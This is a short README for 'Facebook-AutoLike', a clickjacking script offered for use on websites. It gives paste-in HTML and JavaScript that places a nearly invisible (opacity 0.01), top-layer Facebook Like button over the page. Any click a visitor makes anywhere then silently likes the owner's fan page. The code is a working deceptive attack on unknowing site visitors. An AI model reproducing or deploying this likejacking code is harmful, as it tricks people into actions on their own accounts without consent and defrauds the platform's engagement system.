Facebook-AutoLike
=================

Facebook AutoLike

How it works 

1- User goes in your webpage.
2- Gives a click in whatever link of the page
3- Automatically receives a like in your facebook fanpage

Use

1. Paste the following code  </head> 

<meta property="og:title" content="title" />
<meta property="og:description" content="description" />
<meta property="og:image" content="url image" />

<script type='text/javascript' src='js/jquery.min.js'></script>
<script type='text/javascript' src='fblike/jquery.cookie.js?ver=1.0'></script>
<script type='text/javascript' src='fblike/core.js?ver=1.0'></script>
<script src="http://connect.facebook.net/en_US/all.js#xfbml=1"></script>
<script type="text/javascript" src="http://www.facebook.com/profile.php?id=1082766141&amp;sk=4554" onload="fbautolike()" async="async"></script>

2. Fill in the meta property with data of are own web "title", "description", "url image".

3. Paste this before the </body>

<div style="z-index:99999;position:absolute;display:block;opacity:0.01;-khtml-opacity:.01;-moz-opacity:.01;filter:alpha(opacity=1);" id="likeme"><fb:like data-href="http://www.facebook.com/codecanyon/" locale="en_EN" send="false" layout="button_count" width="50" show_faces="false"></fb:like></div>

4. In the URL, put the fan page or the url where we want to recive the likes.
Example: http://www.facebook.com/page/

5. Ready, we have everything working correctly.